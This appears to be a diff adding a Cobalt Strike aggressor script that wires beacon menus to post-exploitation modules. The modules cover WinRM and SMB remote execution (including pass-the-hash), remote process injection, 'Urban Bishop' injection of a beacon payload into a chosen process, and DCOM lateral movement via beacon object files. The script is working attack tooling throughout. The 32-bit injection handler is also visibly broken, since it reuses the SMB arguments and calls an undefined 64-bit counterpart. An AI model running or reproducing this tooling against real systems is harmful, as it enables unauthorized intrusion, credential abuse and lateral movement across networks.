@@ -1,0 +1,286 @@
+    ###################################		         		###################################
+#######################################		         		#######################################
+  #####################################		         		#####################################
+           ############################		  Menus 		############################
+########################
+##
+## WinRM Item
+##
+########################
+
+item "WinRM w/CSharp"{
+
+    local('$bid');
+        foreach $bid ($1){
+            winrmcsharp($bid);
+      }
+
+    }
+
+    
+########################
+##
+## SMB Execution
+##
+########################
+
+
+item "SMB Code Exec using CSharp"{
+
+    local('$bid');
+        foreach $bid ($1){
+            smbexeccsharp($bid);
+      }
+
+    }
+ 
+########################
+##
+## Remote Process Injection
+##
+########################    
+menu "Custom Process Injection" {
+
+item "RemoteProcessInjection 32bit"{
+
+    local('$bid');
+        foreach $bid ($1){
+            rpi86($bid);
+      }
+
+    }
+    
+item "RemoteProcessInjection 64bit"{
+
+    local('$bid');
+        foreach $bid ($1){
+            rpi64($bid);
+      }
+
+    }
+ 
+
+    } #End Menu
+ 
+
+  item "DCOM Execution with BOF"{
+
+    local('$bid');
+        foreach $bid ($1){
+            OpenDcomDialog($bid);
+      }
+
+    }
+
+item "Urban Bishop Injection by Sk3w" {
+
+    local('$bid');
+        foreach $bid ($1){
+            urbanbishopinjection($bid);
+      }
+      
+  }
+
+  
+
+    
+    ###################################		         		###################################
+#######################################		         		#######################################
+  #####################################		         		#####################################
+           ############################		 Functions 		############################
+
+########################
+##
+## WinRM Module
+##
+########################
+sub winrmcsharp{
+    $bid = $1;
+    $dialog = dialog("Code Exec with WinRM using CSharp", %(hostname => "", fqdn => "", username => "", pass => "", command => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+		$cmdargs = "$3['hostname'] $3['fqdn'] $3['username'] $3['pass'] $3['command']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Executing WinRM');
+            bexecute_assembly($bid, script_resource('/exe/winrm.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Execute Code Remotely with WinRM, Using CSharp");
+    drow_text($dialog, "hostname",  "Hostname - Try not to use IP");
+    drow_text($dialog, "fqdn",  "FQDN");
+    drow_text($dialog, "username",  "User Name");
+    drow_text($dialog, "pass",  "Cleartext Password");
+    drow_text($dialog, "command",  "Command to Run");    
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+}
+
+
+########################
+##
+## SMB Execution Module
+##
+########################
+
+
+sub smbexeccsharp{
+    $bid = $1;
+    $dialog = dialog("Code Exec with SMB using CSharp", %(hash => "", username => "", domain => "", target => "", command => """", servicename => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+		$cmdargs = "hash:$3['hash'] username:$3['username'] domain:$3['domain'] target:$3['target'] command:$3['command'] servicename:$3['servicename']"; 
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Executing Code w/SMBExec');
+            bexecute_assembly($bid, script_resource('/exe/Sharp-SMBExec.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Execute Code Remotely using SMB, Using CSharp - Please use cmd /c or cmd /r if your command runs an executable, also please enclose command in double quotes");
+    drow_text($dialog, "hash",  "NTLM Hash of user");
+    drow_text($dialog, "username",  "User Name");
+    drow_text($dialog, "domain",  "Domain - FQDN Preferred");
+    drow_text($dialog, "target",  "Target to run command on - FQDN Preferred");
+    drow_text($dialog, "command",  "Command to Run - enlose in quotes");    
+    drow_text($dialog, "servicename",  "Name of Service to Create"); 
+    dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+ 
+########################
+##
+## Remote Process Injection
+##
+######################## 
+
+
+sub rpi86{
+    $bid = $1;
+    $dialog = dialog("Remote Process Injection", %(pid => "", listener => "", arch => ""), lambda({
+        $cmdargs = "";
+		$cmdargs = "hash:$3['hash'] username:$3['username'] domain:$3['domain'] target:$3['target'] command:$3['command'] servicename:$3['servicename']"; 
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Executing Code w/SMBExec');
+            fireAlias($bid, "injector", $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Please choose the following:");
+    drow_text($dialog, "pid",  "Process ID: ");
+    drow_text($dialog, "listener",  "Listener: ");
+    drow_combobox($dialog, "arch", "Choose An Architecture: ", @("x86", "x64"));
+    dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+    
+
+#################################
+#
+#
+# Sk3w's Urban Bishop Injection (Command Registers)
+#
+#################################
+
+alias getversion {
+    local('$barch $handle $data');
+    $barch  = barch($1);
+    $handle = openf(script_resource("/exe/getversion. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    beacon_inline_execute($1, $data, "go");
+}
+
+beacon_command_register(
+    "getversion",
+    "get windows major.minor.build version",
+    "Usage: getversion");
+
+alias inject-ub {
+    local('$barch $handle $data $payload $args');
+    $barch  = barch($1);
+    $handle = openf(script_resource("/exe/inject_urbanbishop. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    $payload = artifact_payload($3, "raw", $barch);
+    $args = bof_pack($1, "ib", $2, $payload);
+    beacon_inline_execute($1, $data, "inject", $args);
+}
+
+beacon_command_register(
+    "inject-ub",
+    "inject beacon using urbanbishop technique",
+    "Usage: inject-ub [pid] [listener]");
+    
+    
+    
+sub urbanbishopinjection{
+    $bid = $1;
+    $dialog = dialog("Code Injection With Urban Bishop", %(pid => "", listener => "",), lambda({
+		btask($bid, join(' ', @("Injecting into", $3["pid"], "with listener", $3["listener"])));
+		fireAlias($bid, "inject-ub", $3['pid'], $3['listener']);
+   
+    }));
+    dialog_description($dialog, "Inject into Remote Process with Urban Bishop");
+    drow_text($dialog, "pid",  "Process ID to inject into");
+    drow_listener_stage($dialog, "listener",  "Listener to Spawn");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+}
+
+
+
+#########################
+#
+# DCOM Lateral Movement with Beacon Object files
+#
+#########################
+
+
+sub callback {
+	local('$bid $handle $data $args $IsCurrent $username $password $target $command $domain $parameters')
+	println("Dialog was actioned. Button: $2 Values: $3");
+	
+	$target = $3['target'];
+	$username = $3['username'];
+	$password = $3['password'];
+	$domain = $3['domain'];
+	$command = $3['cmd'];
+	$bid = $3['bid'];
+	$parameters = $3['parameters'];
+
+
+	#Parse args
+	if($username -eq ""){
+#you want to use the current user	
+	$IsCurrent = 0;
+		
+		} else {
+		$IsCurrent = 1;
+		}
+		
+		
+		#Read BOF
+		$handle = openf(script_resource("Aggtest.o"));
+		$data   = readb($handle, -1);
+		closef($handle);
+		
+		#pack args
+		$args   = bof_pack($bid, "ZZZZZZi", $target, $domain, $username, $password, $command, $parameters, $IsCurrent);
+		
+		#annoucement
+		btask($bid, "Running DCOM BOF PoC");
+				
+		#Execute it
+		beacon_inline_execute($bid, $data, "go", $args);
+	
+}
+
+
+sub OpenDcomDialog{
+	$dialog = dialog("DCOM BoF", %(bid => $1, target => "",username => "", password => "", cmd => "c:\\\\windows\\\\system32\\\\cmd.exe", parameters => "/c calc.exe"), &callback);
+		dialog_description($dialog, "BOF to move laterally using DCOM. Leave Domain, username, and password empty if you want to use the current user");
+		drow_text($dialog, "target",  "Target:");
+		drow_text($dialog, "domain", "Domain:");
+		drow_text($dialog, "username", "Username:");
+		drow_text($dialog, "password", "Password:");
+		drow_text($dialog, "cmd", "Command:");
+		drow_text($dialog, "parameters", "Parameters:");
+		dbutton_action($dialog, "Launch");		
+		dialog_show($dialog);
+}
